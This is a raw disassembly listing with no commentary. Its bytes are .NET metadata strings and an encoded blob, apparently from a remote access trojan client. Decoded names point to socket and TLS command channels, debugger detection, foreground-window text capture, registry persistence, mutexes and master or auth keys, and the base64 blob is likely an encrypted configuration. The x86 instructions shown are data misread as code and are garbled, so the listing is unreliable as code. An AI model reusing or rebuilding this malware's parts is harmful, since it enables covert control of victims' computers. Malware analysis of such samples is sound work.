  40918a:	2e 4e                	cs dec %esi
  40918c:	65 74 00             	gs je  0x40918f
  40918f:	53                   	push   %ebx
  409190:	65 74 00             	gs je  0x409193
  409193:	54                   	push   %esp
  409194:	61                   	popa
  409195:	72 67                	jb     0x4091fe
  409197:	65 74 00             	gs je  0x40919a
  40919a:	43                   	inc    %ebx
  40919b:	6c                   	insb   (%dx),%es:(%edi)
  40919c:	69 65 6e 74 2e 48 61 	imul   $0x61482e74,0x6e(%ebp),%esp
  4091a3:	6e                   	outsb  %ds:(%esi),(%dx)
  4091a4:	64 6c                	fs insb (%dx),%es:(%edi)
  4091a6:	65 5f                	gs pop %edi
  4091a8:	50                   	push   %eax
  4091a9:	61                   	popa
  4091aa:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  4091ad:	74 00                	je     0x4091af
  4091af:	4b                   	dec    %ebx
  4091b0:	65 65 70 41          	gs gs jo 0x4091f5
  4091b4:	6c                   	insb   (%dx),%es:(%edi)
  4091b5:	69 76 65 50 61 63 6b 	imul   $0x6b636150,0x65(%esi),%esi
  4091bc:	65 74 00             	gs je  0x4091bf
  4091bf:	43                   	inc    %ebx
  4091c0:	6c                   	insb   (%dx),%es:(%edi)
  4091c1:	69 65 6e 74 53 6f 63 	imul   $0x636f5374,0x6e(%ebp),%esp
  4091c8:	6b 65 74 00          	imul   $0x0,0x74(%ebp),%esp
  4091cc:	53                   	push   %ebx
  4091cd:	79 73                	jns    0x409242
  4091cf:	74 65                	je     0x409236
  4091d1:	6d                   	insl   (%dx),%es:(%edi)
  4091d2:	2e 43                	cs inc %ebx
  4091d4:	6f                   	outsl  %ds:(%esi),(%dx)
  4091d5:	6c                   	insb   (%dx),%es:(%edi)
  4091d6:	6c                   	insb   (%dx),%es:(%edi)
  4091d7:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4091dc:	6e                   	outsb  %ds:(%esi),(%dx)
  4091dd:	73 2e                	jae    0x40920d
  4091df:	49                   	dec    %ecx
  4091e0:	45                   	inc    %ebp
  4091e1:	6e                   	outsb  %ds:(%esi),(%dx)
  4091e2:	75 6d                	jne    0x409251
  4091e4:	65 72 61             	gs jb  0x409248
  4091e7:	74 6f                	je     0x409258
  4091e9:	72 2e                	jb     0x409219
  4091eb:	52                   	push   %edx
  4091ec:	65 73 65             	gs jae 0x409254
  4091ef:	74 00                	je     0x4091f1
  4091f1:	67 65 74 5f          	addr16 gs je 0x409254
  4091f5:	4f                   	dec    %edi
  4091f6:	66 66 73 65          	data16 data16 jae 0x40925f
  4091fa:	74 00                	je     0x4091fc
  4091fc:	73 65                	jae    0x409263
  4091fe:	74 5f                	je     0x40925f
  409200:	4f                   	dec    %edi
  409201:	66 66 73 65          	data16 data16 jae 0x40926a
  409205:	74 00                	je     0x409207
  409207:	53                   	push   %ebx
  409208:	70 6c                	jo     0x409276
  40920a:	69 74 00 43 6c 69 65 	imul   $0x6e65696c,0x43(%eax,%eax,1),%esi
  409211:	6e 
  409212:	74 4f                	je     0x409263
  409214:	6e                   	outsb  %ds:(%esi),(%dx)
  409215:	45                   	inc    %ebp
  409216:	78 69                	js     0x409281
  409218:	74 00                	je     0x40921a
  40921a:	53                   	push   %ebx
  40921b:	61                   	popa
  40921c:	6c                   	insb   (%dx),%es:(%edi)
  40921d:	74 00                	je     0x40921f
  40921f:	49                   	dec    %ecx
  409220:	41                   	inc    %ecx
  409221:	73 79                	jae    0x40929c
  409223:	6e                   	outsb  %ds:(%esi),(%dx)
  409224:	63 52 65             	arpl   %edx,0x65(%edx)
  409227:	73 75                	jae    0x40929e
  409229:	6c                   	insb   (%dx),%es:(%edi)
  40922a:	74 00                	je     0x40922c
  40922c:	54                   	push   %esp
  40922d:	6f                   	outsl  %ds:(%esi),(%dx)
  40922e:	55                   	push   %ebp
  40922f:	70 70                	jo     0x4092a1
  409231:	65 72 49             	gs jb  0x40927d
  409234:	6e                   	outsb  %ds:(%esi),(%dx)
  409235:	76 61                	jbe    0x409298
  409237:	72 69                	jb     0x4092a2
  409239:	61                   	popa
  40923a:	6e                   	outsb  %ds:(%esi),(%dx)
  40923b:	74 00                	je     0x40923d
  40923d:	57                   	push   %edi
  40923e:	65 62 43 6c          	bound  %eax,%gs:0x6c(%ebx)
  409242:	69 65 6e 74 00 49 6e 	imul   $0x6e490074,0x6e(%ebp),%esp
  409249:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  409250:	65 
  409251:	43                   	inc    %ebx
  409252:	6c                   	insb   (%dx),%es:(%edi)
  409253:	69 65 6e 74 00 67 65 	imul   $0x65670074,0x6e(%ebp),%esp
  40925a:	74 5f                	je     0x4092bb
  40925c:	53                   	push   %ebx
  40925d:	73 6c                	jae    0x4092cb
  40925f:	43                   	inc    %ebx
  409260:	6c                   	insb   (%dx),%es:(%edi)
  409261:	69 65 6e 74 00 73 65 	imul   $0x65730074,0x6e(%ebp),%esp
  409268:	74 5f                	je     0x4092c9
  40926a:	53                   	push   %ebx
  40926b:	73 6c                	jae    0x4092d9
  40926d:	43                   	inc    %ebx
  40926e:	6c                   	insb   (%dx),%es:(%edi)
  40926f:	69 65 6e 74 00 67 65 	imul   $0x65670074,0x6e(%ebp),%esp
  409276:	74 5f                	je     0x4092d7
  409278:	54                   	push   %esp
  409279:	63 70 43             	arpl   %esi,0x43(%eax)
  40927c:	6c                   	insb   (%dx),%es:(%edi)
  40927d:	69 65 6e 74 00 73 65 	imul   $0x65730074,0x6e(%ebp),%esp
  409284:	74 5f                	je     0x4092e5
  409286:	54                   	push   %esp
  409287:	63 70 43             	arpl   %esi,0x43(%eax)
  40928a:	6c                   	insb   (%dx),%es:(%edi)
  40928b:	69 65 6e 74 00 41 75 	imul   $0x75410074,0x6e(%ebp),%esp
  409292:	74 68                	je     0x4092fc
  409294:	65 6e                	outsb  %gs:(%esi),(%dx)
  409296:	74 69                	je     0x409301
  409298:	63 61 74             	arpl   %esp,0x74(%ecx)
  40929b:	65 41                	gs inc %ecx
  40929d:	73 43                	jae    0x4092e2
  40929f:	6c                   	insb   (%dx),%es:(%edi)
  4092a0:	69 65 6e 74 00 53 79 	imul   $0x79530074,0x6e(%ebp),%esp
  4092a7:	73 74                	jae    0x40931d
  4092a9:	65 6d                	gs insl (%dx),%es:(%edi)
  4092ab:	2e 4d                	cs dec %ebp
  4092ad:	61                   	popa
  4092ae:	6e                   	outsb  %ds:(%esi),(%dx)
  4092af:	61                   	popa
  4092b0:	67 65 6d             	gs insl (%dx),%es:(%di)
  4092b3:	65 6e                	outsb  %gs:(%esi),(%dx)
  4092b5:	74 00                	je     0x4092b7
  4092b7:	45                   	inc    %ebp
  4092b8:	6e                   	outsb  %ds:(%esi),(%dx)
  4092b9:	76 69                	jbe    0x409324
  4092bb:	72 6f                	jb     0x40932c
  4092bd:	6e                   	outsb  %ds:(%esi),(%dx)
  4092be:	6d                   	insl   (%dx),%es:(%edi)
  4092bf:	65 6e                	outsb  %gs:(%esi),(%dx)
  4092c1:	74 00                	je     0x4092c3
  4092c3:	70 61                	jo     0x409326
  4092c5:	72 65                	jb     0x40932c
  4092c7:	6e                   	outsb  %ds:(%esi),(%dx)
  4092c8:	74 00                	je     0x4092ca
  4092ca:	53                   	push   %ebx
  4092cb:	79 73                	jns    0x409340
  4092cd:	74 65                	je     0x409334
  4092cf:	6d                   	insl   (%dx),%es:(%edi)
  4092d0:	2e 43                	cs inc %ebx
  4092d2:	6f                   	outsl  %ds:(%esi),(%dx)
  4092d3:	6c                   	insb   (%dx),%es:(%edi)
  4092d4:	6c                   	insb   (%dx),%es:(%edi)
  4092d5:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4092da:	6e                   	outsb  %ds:(%esi),(%dx)
  4092db:	73 2e                	jae    0x40930b
  4092dd:	49                   	dec    %ecx
  4092de:	45                   	inc    %ebp
  4092df:	6e                   	outsb  %ds:(%esi),(%dx)
  4092e0:	75 6d                	jne    0x40934f
  4092e2:	65 72 61             	gs jb  0x409346
  4092e5:	74 6f                	je     0x409356
  4092e7:	72 2e                	jb     0x409317
  4092e9:	43                   	inc    %ebx
  4092ea:	75 72                	jne    0x40935e
  4092ec:	72 65                	jb     0x409353
  4092ee:	6e                   	outsb  %ds:(%esi),(%dx)
  4092ef:	74 00                	je     0x4092f1
  4092f1:	53                   	push   %ebx
  4092f2:	79 73                	jns    0x409367
  4092f4:	74 65                	je     0x40935b
  4092f6:	6d                   	insl   (%dx),%es:(%edi)
  4092f7:	2e 43                	cs inc %ebx
  4092f9:	6f                   	outsl  %ds:(%esi),(%dx)
  4092fa:	6c                   	insb   (%dx),%es:(%edi)
  4092fb:	6c                   	insb   (%dx),%es:(%edi)
  4092fc:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  409301:	6e                   	outsb  %ds:(%esi),(%dx)
  409302:	73 2e                	jae    0x409332
  409304:	49                   	dec    %ecx
  409305:	45                   	inc    %ebp
  409306:	6e                   	outsb  %ds:(%esi),(%dx)
  409307:	75 6d                	jne    0x409376
  409309:	65 72 61             	gs jb  0x40936d
  40930c:	74 6f                	je     0x40937d
  40930e:	72 2e                	jb     0x40933e
  409310:	67 65 74 5f          	addr16 gs je 0x409373
  409314:	43                   	inc    %ebx
  409315:	75 72                	jne    0x409389
  409317:	72 65                	jb     0x40937e
  409319:	6e                   	outsb  %ds:(%esi),(%dx)
  40931a:	74 00                	je     0x40931c
  40931c:	47                   	inc    %edi
  40931d:	65 74 43             	gs je  0x409363
  409320:	75 72                	jne    0x409394
  409322:	72 65                	jb     0x409389
  409324:	6e                   	outsb  %ds:(%esi),(%dx)
  409325:	74 00                	je     0x409327
  409327:	43                   	inc    %ebx
  409328:	68 65 63 6b 52       	push   $0x526b6365
  40932d:	65 6d                	gs insl (%dx),%es:(%edi)
  40932f:	6f                   	outsl  %ds:(%esi),(%dx)
  409330:	74 65                	je     0x409397
  409332:	44                   	inc    %esp
  409333:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  409337:	67 65 72 50          	addr16 gs jb 0x40938b
  40933b:	72 65                	jb     0x4093a2
  40933d:	73 65                	jae    0x4093a4
  40933f:	6e                   	outsb  %ds:(%esi),(%dx)
  409340:	74 00                	je     0x409342
  409342:	69 73 44 65 62 75 67 	imul   $0x67756265,0x44(%ebx),%esi
  409349:	67 65 72 50          	addr16 gs jb 0x40939d
  40934d:	72 65                	jb     0x4093b4
  40934f:	73 65                	jae    0x4093b6
  409351:	6e                   	outsb  %ds:(%esi),(%dx)
  409352:	74 00                	je     0x409354
  409354:	67 65 74 5f          	addr16 gs je 0x4093b7
  409358:	52                   	push   %edx
  409359:	65 6d                	gs insl (%dx),%es:(%edi)
  40935b:	6f                   	outsl  %ds:(%esi),(%dx)
  40935c:	74 65                	je     0x4093c3
  40935e:	45                   	inc    %ebp
  40935f:	6e                   	outsb  %ds:(%esi),(%dx)
  409360:	64 50                	fs push %eax
  409362:	6f                   	outsl  %ds:(%esi),(%dx)
  409363:	69 6e 74 00 67 65 74 	imul   $0x74656700,0x74(%esi),%ebp
  40936a:	5f                   	pop    %edi
  40936b:	43                   	inc    %ebx
  40936c:	6f                   	outsl  %ds:(%esi),(%dx)
  40936d:	75 6e                	jne    0x4093dd
  40936f:	74 00                	je     0x409371
  409371:	67 65 74 5f          	addr16 gs je 0x4093d4
  409375:	50                   	push   %eax
  409376:	72 6f                	jb     0x4093e7
  409378:	63 65 73             	arpl   %esp,0x73(%ebp)
  40937b:	73 6f                	jae    0x4093ec
  40937d:	72 43                	jb     0x4093c2
  40937f:	6f                   	outsl  %ds:(%esi),(%dx)
  409380:	75 6e                	jne    0x4093f0
  409382:	74 00                	je     0x409384
  409384:	63 6f 75             	arpl   %ebp,0x75(%edi)
  409387:	6e                   	outsb  %ds:(%esi),(%dx)
  409388:	74 00                	je     0x40938a
  40938a:	47                   	inc    %edi
  40938b:	65 74 50             	gs je  0x4093de
  40938e:	61                   	popa
  40938f:	74 68                	je     0x4093f9
  409391:	52                   	push   %edx
  409392:	6f                   	outsl  %ds:(%esi),(%dx)
  409393:	6f                   	outsl  %ds:(%esi),(%dx)
  409394:	74 00                	je     0x409396
  409396:	44                   	inc    %esp
  409397:	65 63 72 79          	arpl   %esi,%gs:0x79(%edx)
  40939b:	70 74                	jo     0x409411
  40939d:	00 45 6e             	add    %al,0x6e(%ebp)
  4093a0:	63 72 79             	arpl   %esi,0x79(%edx)
  4093a3:	70 74                	jo     0x409419
  4093a5:	00 50 61             	add    %dl,0x61(%eax)
  4093a8:	72 61                	jb     0x40940b
  4093aa:	6d                   	insl   (%dx),%es:(%edi)
  4093ab:	65 74 65             	gs je  0x409413
  4093ae:	72 69                	jb     0x409419
  4093b0:	7a 65                	jp     0x409417
  4093b2:	64 54                	fs push %esp
  4093b4:	68 72 65 61 64       	push   $0x64616572
  4093b9:	53                   	push   %ebx
  4093ba:	74 61                	je     0x40941d
  4093bc:	72 74                	jb     0x409432
  4093be:	00 43 6f             	add    %al,0x6f(%ebx)
  4093c1:	6e                   	outsb  %ds:(%esi),(%dx)
  4093c2:	76 65                	jbe    0x409429
  4093c4:	72 74                	jb     0x40943a
  4093c6:	00 46 61             	add    %al,0x61(%esi)
  4093c9:	69 6c 46 61 73 74 00 	imul   $0x54007473,0x61(%esi,%eax,2),%ebp
  4093d0:	54 
  4093d1:	6f                   	outsl  %ds:(%esi),(%dx)
  4093d2:	4c                   	dec    %esp
  4093d3:	69 73 74 00 69 6e 70 	imul   $0x706e6900,0x74(%ebx),%esi
  4093da:	75 74                	jne    0x409450
  4093dc:	00 53 79             	add    %dl,0x79(%ebx)
  4093df:	73 74                	jae    0x409455
  4093e1:	65 6d                	gs insl (%dx),%es:(%edi)
  4093e3:	2e 43                	cs inc %ebx
  4093e5:	6f                   	outsl  %ds:(%esi),(%dx)
  4093e6:	6c                   	insb   (%dx),%es:(%edi)
  4093e7:	6c                   	insb   (%dx),%es:(%edi)
  4093e8:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4093ed:	6e                   	outsb  %ds:(%esi),(%dx)
  4093ee:	73 2e                	jae    0x40941e
  4093f0:	49                   	dec    %ecx
  4093f1:	45                   	inc    %ebp
  4093f2:	6e                   	outsb  %ds:(%esi),(%dx)
  4093f3:	75 6d                	jne    0x409462
  4093f5:	65 72 61             	gs jb  0x409459
  4093f8:	74 6f                	je     0x409469
  4093fa:	72 2e                	jb     0x40942a
  4093fc:	4d                   	dec    %ebp
  4093fd:	6f                   	outsl  %ds:(%esi),(%dx)
  4093fe:	76 65                	jbe    0x409465
  409400:	4e                   	dec    %esi
  409401:	65 78 74             	gs js  0x409478
  409404:	00 53 79             	add    %dl,0x79(%ebx)
  409407:	73 74                	jae    0x40947d
  409409:	65 6d                	gs insl (%dx),%es:(%edi)
  40940b:	2e 54                	cs push %esp
  40940d:	65 78 74             	gs js  0x409484
  409410:	00 47 65             	add    %al,0x65(%edi)
  409413:	74 57                	je     0x40946c
  409415:	69 6e 64 6f 77 54 65 	imul   $0x6554776f,0x64(%esi),%ebp
  40941c:	78 74                	js     0x409492
  40941e:	00 74 65 78          	add    %dh,0x78(%ebp,%eiz,2)
  409422:	74 00                	je     0x409424
  409424:	76 00                	jbe    0x409426
  409426:	47                   	inc    %edi
  409427:	65 74 46             	gs je  0x409470
  40942a:	6f                   	outsl  %ds:(%esi),(%dx)
  40942b:	72 65                	jb     0x409492
  40942d:	67 72 6f             	addr16 jb 0x40949f
  409430:	75 6e                	jne    0x4094a0
  409432:	64 57                	fs push %edi
  409434:	69 6e 64 6f 77 00 73 	imul   $0x7300776f,0x64(%esi),%ebp
  40943b:	65 74 5f             	gs je  0x40949d
  40943e:	43                   	inc    %ebx
  40943f:	72 65                	jb     0x4094a6
  409441:	61                   	popa
  409442:	74 65                	je     0x4094a9
  409444:	4e                   	dec    %esi
  409445:	6f                   	outsl  %ds:(%esi),(%dx)
  409446:	57                   	push   %edi
  409447:	69 6e 64 6f 77 00 69 	imul   $0x6900776f,0x64(%esi),%ebp
  40944e:	6e                   	outsb  %ds:(%esi),(%dx)
  40944f:	64 65 78 00          	fs gs js 0x409453
  409453:	43                   	inc    %ebx
  409454:	6c                   	insb   (%dx),%es:(%edi)
  409455:	6f                   	outsl  %ds:(%esi),(%dx)
  409456:	73 65                	jae    0x4094bd
  409458:	4d                   	dec    %ebp
  409459:	75 74                	jne    0x4094cf
  40945b:	65 78 00             	gs js  0x40945e
  40945e:	43                   	inc    %ebx
  40945f:	72 65                	jb     0x4094c6
  409461:	61                   	popa
  409462:	74 65                	je     0x4094c9
  409464:	4d                   	dec    %ebp
  409465:	75 74                	jne    0x4094db
  409467:	65 78 00             	gs js  0x40946a
  40946a:	44                   	inc    %esp
  40946b:	65 6c                	gs insb (%dx),%es:(%edi)
  40946d:	61                   	popa
  40946e:	79 00                	jns    0x409470
  409470:	57                   	push   %edi
  409471:	69 72 74 65 41 72 72 	imul   $0x72724165,0x74(%edx),%esi
  409478:	61                   	popa
  409479:	79 00                	jns    0x40947b
  40947b:	49                   	dec    %ecx
  40947c:	6e                   	outsb  %ds:(%esi),(%dx)
  40947d:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  409484:	65 
  409485:	41                   	inc    %ecx
  409486:	72 72                	jb     0x4094fa
  409488:	61                   	popa
  409489:	79 00                	jns    0x40948b
  40948b:	4d                   	dec    %ebp
  40948c:	73 67                	jae    0x4094f5
  40948e:	50                   	push   %eax
  40948f:	61                   	popa
  409490:	63 6b 41             	arpl   %ebp,0x41(%ebx)
  409493:	72 72                	jb     0x409507
  409495:	61                   	popa
  409496:	79 00                	jns    0x409498
  409498:	54                   	push   %esp
  409499:	6f                   	outsl  %ds:(%esi),(%dx)
  40949a:	41                   	inc    %ecx
  40949b:	72 72                	jb     0x40950f
  40949d:	61                   	popa
  40949e:	79 00                	jns    0x4094a0
  4094a0:	67 65 74 5f          	addr16 gs je 0x409503
  4094a4:	41                   	inc    %ecx
  4094a5:	73 41                	jae    0x4094e8
  4094a7:	72 72                	jb     0x40951b
  4094a9:	61                   	popa
  4094aa:	79 00                	jns    0x4094ac
  4094ac:	72 65                	jb     0x409513
  4094ae:	66 41                	inc    %cx
  4094b0:	73 41                	jae    0x4094f3
  4094b2:	72 72                	jb     0x409526
  4094b4:	61                   	popa
  4094b5:	79 00                	jns    0x4094b7
  4094b7:	67 65 74 5f          	addr16 gs je 0x40951a
  4094bb:	4b                   	dec    %ebx
  4094bc:	65 79 00             	gs jns 0x4094bf
  4094bf:	73 65                	jae    0x409526
  4094c1:	74 5f                	je     0x409522
  4094c3:	4b                   	dec    %ebx
  4094c4:	65 79 00             	gs jns 0x4094c7
  4094c7:	43                   	inc    %ebx
  4094c8:	72 65                	jb     0x40952f
  4094ca:	61                   	popa
  4094cb:	74 65                	je     0x409532
  4094cd:	53                   	push   %ebx
  4094ce:	75 62                	jne    0x409532
  4094d0:	4b                   	dec    %ebx
  4094d1:	65 79 00             	gs jns 0x4094d4
  4094d4:	44                   	inc    %esp
  4094d5:	65 6c                	gs insb (%dx),%es:(%edi)
  4094d7:	65 74 65             	gs je  0x40953f
  4094da:	53                   	push   %ebx
  4094db:	75 62                	jne    0x40953f
  4094dd:	4b                   	dec    %ebx
  4094de:	65 79 00             	gs jns 0x4094e1
  4094e1:	4f                   	dec    %edi
  4094e2:	70 65                	jo     0x409549
  4094e4:	6e                   	outsb  %ds:(%esi),(%dx)
  4094e5:	53                   	push   %ebx
  4094e6:	75 62                	jne    0x40954a
  4094e8:	4b                   	dec    %ebx
  4094e9:	65 79 00             	gs jns 0x4094ec
  4094ec:	67 65 74 5f          	addr16 gs je 0x40954f
  4094f0:	50                   	push   %eax
  4094f1:	75 62                	jne    0x409555
  4094f3:	6c                   	insb   (%dx),%es:(%edi)
  4094f4:	69 63 4b 65 79 00 5f 	imul   $0x5f007965,0x4b(%ebx),%esp
  4094fb:	61                   	popa
  4094fc:	75 74                	jne    0x409572
  4094fe:	68 4b 65 79 00       	push   $0x79654b
  409503:	6d                   	insl   (%dx),%es:(%edi)
  409504:	61                   	popa
  409505:	73 74                	jae    0x40957b
  409507:	65 72 4b             	gs jb  0x409555
  40950a:	65 79 00             	gs jns 0x40950d
  40950d:	52                   	push   %edx
  40950e:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  409515:	4b 65 
  409517:	79 00                	jns    0x409519
  409519:	5f                   	pop    %edi
  40951a:	6b 65 79 00          	imul   $0x0,0x79(%ebp),%esp
  40951e:	53                   	push   %ebx
  40951f:	79 73                	jns    0x409594
  409521:	74 65                	je     0x409588
  409523:	6d                   	insl   (%dx),%es:(%edi)
  409524:	2e 53                	cs push %ebx
  409526:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  40952a:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  409531:	70 
  409532:	74 6f                	je     0x4095a3
  409534:	67 72 61             	addr16 jb 0x409598
  409537:	70 68                	jo     0x4095a1
  409539:	79 00                	jns    0x40953b
  40953b:	41                   	inc    %ecx
  40953c:	73 73                	jae    0x4095b1
  40953e:	65 6d                	gs insl (%dx),%es:(%edi)
  409540:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  409544:	41                   	inc    %ecx
  409545:	64 64 72 65          	fs fs jb 0x4095ae
  409549:	73 73                	jae    0x4095be
  40954b:	46                   	inc    %esi
  40954c:	61                   	popa
  40954d:	6d                   	insl   (%dx),%es:(%edi)
  40954e:	69 6c 79 00 42 6c 6f 	imul   $0x636f6c42,0x0(%ecx,%edi,2),%ebp
  409555:	63 
  409556:	6b 43 6f 70          	imul   $0x70,0x6f(%ebx),%eax
  40955a:	79 00                	jns    0x40955c
  40955c:	57                   	push   %edi
  40955d:	72 69                	jb     0x4095c8
  40955f:	74 65                	je     0x4095c6
  409561:	42                   	inc    %edx
  409562:	69 6e 61 72 79 00 54 	imul   $0x54007972,0x61(%esi),%ebp
  409569:	6f                   	outsl  %ds:(%esi),(%dx)
  40956a:	42                   	inc    %edx
  40956b:	69 6e 61 72 79 00 67 	imul   $0x67007972,0x61(%esi),%ebp
  409572:	65 74 5f             	gs je  0x4095d4
  409575:	53                   	push   %ebx
  409576:	79 73                	jns    0x4095eb
  409578:	74 65                	je     0x4095df
  40957a:	6d                   	insl   (%dx),%es:(%edi)
  40957b:	44                   	inc    %esp
  40957c:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  409583:	79 00                	jns    0x409585
  409585:	53                   	push   %ebx
  409586:	65 74 52             	gs je  0x4095db
  409589:	65 67 69 73 74 72 79 	imul   $0x6f007972,%gs:0x74(%bp,%di),%esi
  409590:	00 6f 
  409592:	70 5f                	jo     0x4095f3
  409594:	45                   	inc    %ebp
  409595:	71 75                	jno    0x40960c
  409597:	61                   	popa
  409598:	6c                   	insb   (%dx),%es:(%edi)
  409599:	69 74 79 00 6f 70 5f 	imul   $0x495f706f,0x0(%ecx,%edi,2),%esi
  4095a0:	49 
  4095a1:	6e                   	outsb  %ds:(%esi),(%dx)
  4095a2:	65 71 75             	gs jno 0x40961a
  4095a5:	61                   	popa
  4095a6:	6c                   	insb   (%dx),%es:(%edi)
  4095a7:	69 74 79 00 53 79 73 	imul   $0x74737953,0x0(%ecx,%edi,2),%esi
  4095ae:	74 
  4095af:	65 6d                	gs insl (%dx),%es:(%edi)
  4095b1:	2e 4e                	cs dec %esi
  4095b3:	65 74 2e             	gs je  0x4095e4
  4095b6:	53                   	push   %ebx
  4095b7:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  4095bb:	69 74 79 00 57 69 6e 	imul   $0x646e6957,0x0(%ecx,%edi,2),%esi
  4095c2:	64 
  4095c3:	6f                   	outsl  %ds:(%esi),(%dx)
  4095c4:	77 73                	ja     0x409639
  4095c6:	49                   	dec    %ecx
  4095c7:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  4095ca:	74 69                	je     0x409635
  4095cc:	74 79                	je     0x409647
  4095ce:	00 49 73             	add    %cl,0x73(%ecx)
  4095d1:	4e                   	dec    %esi
  4095d2:	75 6c                	jne    0x409640
  4095d4:	6c                   	insb   (%dx),%es:(%edi)
  4095d5:	4f                   	dec    %edi
  4095d6:	72 45                	jb     0x40961d
  4095d8:	6d                   	insl   (%dx),%es:(%edi)
  4095d9:	70 74                	jo     0x40964f
  4095db:	79 00                	jns    0x4095dd
  4095dd:	00 00                	add    %al,(%eax)
  4095df:	00 00                	add    %al,(%eax)
  4095e1:	0d 53 00 48 00       	or     $0x480053,%eax
  4095e6:	41                   	inc    %ecx
  4095e7:	00 32                	add    %dh,(%edx)
  4095e9:	00 35 00 36 00 00    	add    %dh,0x3600
  4095ef:	80 d9 42             	sbb    $0x42,%cl
  4095f2:	00 58 00             	add    %bl,0x0(%eax)
  4095f5:	50                   	push   %eax
  4095f6:	00 69 00             	add    %ch,0x0(%ecx)
  4095f9:	39 00                	cmp    %eax,(%eax)
  4095fb:	38 00                	cmp    %al,(%eax)
  4095fd:	4b                   	dec    %ebx
  4095fe:	00 70 00             	add    %dh,0x0(%eax)
  409601:	65 00 69 00          	add    %ch,%gs:0x0(%ecx)
  409605:	32 00                	xor    (%eax),%al
  409607:	6e                   	outsb  %ds:(%esi),(%dx)
  409608:	00 39                	add    %bh,(%ecx)
  40960a:	00 70 00             	add    %dh,0x0(%eax)
  40960d:	4c                   	dec    %esp
  40960e:	00 6a 00             	add    %ch,0x0(%edx)
  409611:	44                   	inc    %esp
  409612:	00 4f 00             	add    %cl,0x0(%edi)
  409615:	7a 00                	jp     0x409617
  409617:	66 00 79 00          	data16 add %bh,0x0(%ecx)
  40961b:	42                   	inc    %edx
  40961c:	00 57 00             	add    %dl,0x0(%edi)
  40961f:	38 00                	cmp    %al,(%eax)
  409621:	48                   	dec    %eax
  409622:	00 6a 00             	add    %ch,0x0(%edx)
  409625:	67 00 6e 00          	add    %ch,0x0(%bp)
  409629:	73 00                	jae    0x40962b
  40962b:	52                   	push   %edx
  40962c:	00 4a 00             	add    %cl,0x0(%edx)
  40962f:	6c                   	insb   (%dx),%es:(%edi)
  409630:	00 47 00             	add    %al,0x0(%edi)
  409633:	6a 00                	push   $0x0
  409635:	6d                   	insl   (%dx),%es:(%edi)
  409636:	00 76 00             	add    %dh,0x0(%esi)
  409639:	63 00                	arpl   %eax,(%eax)
  40963b:	34 00                	xor    $0x0,%al
  40963d:	41                   	inc    %ecx
  40963e:	00 57 00             	add    %dl,0x0(%edi)
  409641:	58                   	pop    %eax
  409642:	00 42 00             	add    %al,0x0(%edx)
  409645:	4e                   	dec    %esi
  409646:	00 4d 00             	add    %cl,0x0(%ebp)
  409649:	72 00                	jb     0x40964b
  40964b:	37                   	aaa
  40964c:	00 43 00             	add    %al,0x0(%ebx)
  40964f:	56                   	push   %esi
  409650:	00 39                	add    %bh,(%ecx)
  409652:	00 36                	add    %dh,(%esi)
  409654:	00 31                	add    %dh,(%ecx)
  409656:	00 6b 00             	add    %ch,0x0(%ebx)
  409659:	50                   	push   %eax
  40965a:	00 4f 00             	add    %cl,0x0(%edi)
  40965d:	75 00                	jne    0x40965f
  40965f:	33 00                	xor    (%eax),%eax
  409661:	39 00                	cmp    %eax,(%eax)
  409663:	4a                   	dec    %edx
  409664:	00 70 00             	add    %dh,0x0(%eax)
  409667:	44                   	inc    %esp
  409668:	00 37                	add    %dh,(%edi)
  40966a:	00 42 00             	add    %al,0x0(%edx)
  40966d:	34 00                	xor    $0x0,%al
  40966f:	51                   	push   %ecx
  409670:	00 70 00             	add    %dh,0x0(%eax)
  409673:	70 00                	jo     0x409675
  409675:	79 00                	jns    0x409677
  409677:	46                   	inc    %esi
  409678:	00 43 00             	add    %al,0x0(%ebx)
  40967b:	34 00                	xor    $0x0,%al
  40967d:	4d                   	dec    %ebp
  40967e:	00 51 00             	add    %dl,0x0(%ecx)
  409681:	6d                   	insl   (%dx),%es:(%edi)
  409682:	00 43 00             	add    %al,0x0(%ebx)
  409685:	59                   	pop    %ecx
  409686:	00 37                	add    %dh,(%edi)
  409688:	00 50 00             	add    %dl,0x0(%eax)
  40968b:	68 00 35 00 61       	push   $0x61003500
  409690:	00 72 00             	add    %dh,0x0(%edx)
  409693:	73 00                	jae    0x409695
  409695:	59                   	pop    %ecx
  409696:	00 52 00             	add    %dl,0x0(%edx)
  409699:	6c                   	insb   (%dx),%es:(%edi)
  40969a:	00 76 00             	add    %dh,0x0(%esi)
  40969d:	59                   	pop    %ecx
  40969e:	00 45 00             	add    %al,0x0(%ebp)
  4096a1:	50                   	push   %eax
  4096a2:	00 7a 00             	add    %bh,0x0(%edx)
  4096a5:	7a 00                	jp     0x4096a7
  4096a7:	30 00                	xor    %al,(%eax)
  4096a9:	4e                   	dec    %esi
  4096aa:	00 51 00             	add    %dl,0x0(%ecx)
  4096ad:	76 00                	jbe    0x4096af
  4096af:	45                   	inc    %ebp
  4096b0:	00 74 00 64          	add    %dh,0x64(%eax,%eax,1)
  4096b4:	00 34 00             	add    %dh,(%eax,%eax,1)
  4096b7:	58                   	pop    %eax
  4096b8:	00 76 00             	add    %dh,0x0(%esi)
  4096bb:	2f                   	das
  4096bc:	00 75 00             	add    %dh,0x0(%ebp)
  4096bf:	51                   	push   %ecx
  4096c0:	00 75 00             	add    %dh,0x0(%ebp)
  4096c3:	51                   	push   %ecx
  4096c4:	00 63 00             	add    %ah,0x0(%ebx)
  4096c7:	3d 00 00 80 d9       	cmp    $0xd9800000,%eax
